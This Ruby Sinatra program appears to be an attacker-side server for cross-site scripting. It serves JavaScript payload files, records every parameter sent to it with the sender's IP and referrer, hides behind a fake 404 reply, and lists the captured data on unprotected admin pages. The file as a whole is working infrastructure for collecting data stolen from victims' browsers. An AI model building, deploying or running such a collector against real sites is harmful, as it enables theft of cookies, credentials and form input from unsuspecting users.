require 'rubygems'
require 'dm-core'
require 'dm-migrations/adapters/dm-sqlite-adapter'
require 'sinatra'
require 'erb'
require 'date'
require 'uri'
require 'pathname'

DataMapper::Logger.new($stdout, :debug)
DataMapper.setup(:default, 'sqlite3:accesses.sqlite3')

class Access
  include DataMapper::Resource
  
  property :id,        Serial
  property :timestamp, DateTime
  property :host,      String
  property :method,    String
  property :referrer,  String
  
  has n, :form_data_pairs
end

class FormDataPair
  include DataMapper::Resource
  
  property :id,       Serial
  property :name,     String
  property :value,    Text
end

DataMapper.auto_migrate!


# Enumerate the available payloads in payloads/
class Payload
   attr_accessor :script, :shortname;
   attr_accessor :title, :author, :description;
end

payloads = Hash.new
Dir.glob('payloads/*.js') do |filename|
   p = Payload.new
   p.shortname = File.basename(filename, '.js')
   p.script = File.open(filename, 'r').read
   
   # Parse the metadata from the file
   p.title = (p.script.match(/Title:\s*(.*)\s*/) or ['',''])[1]
   p.author = (p.script.match(/Author:\s*(.*)\s*/) or ['',''])[1]
   p.description = (p.script.match(/Description:\s*(.*)\s*/) or ['',''])[1]
   
   payloads[p.shortname] = p
end


# Log requests made to /
def log_request(request)
   access = Access.new
   access.host = request.ip
   access.referrer = request.referer
   access.timestamp = DateTime.now

   access.method = request.request_method
   
   (request.get? ? request.GET : request.POST).each_pair do |key, value|
      pair = FormDataPair.new
      pair.name = key
      pair.value = value
      access.form_data_pairs << pair
   end

   access.save

   status 404
   'No one here but us chickens.'
end

get '/' do
   log_request(request)
end

post '/' do
   log_request(request)
end

# Serve payload files from /payloads
get '/payloads/:name.js' do
   if payloads.has_key? params[:name]
      payloads[params[:name]].script
   else
      status 404
      'console.log(\'Whistleblower: Requested payload was not found.\');'
   end 
end


get '/admin' do
   redirect '/admin/list'
end


get '/admin/list' do
  @entries = Access.all(:order => [ :timestamp.desc ])
  erb :hitlist
end


get '/admin/payloads' do
   @entries = payloads.values
   erb :payloads
end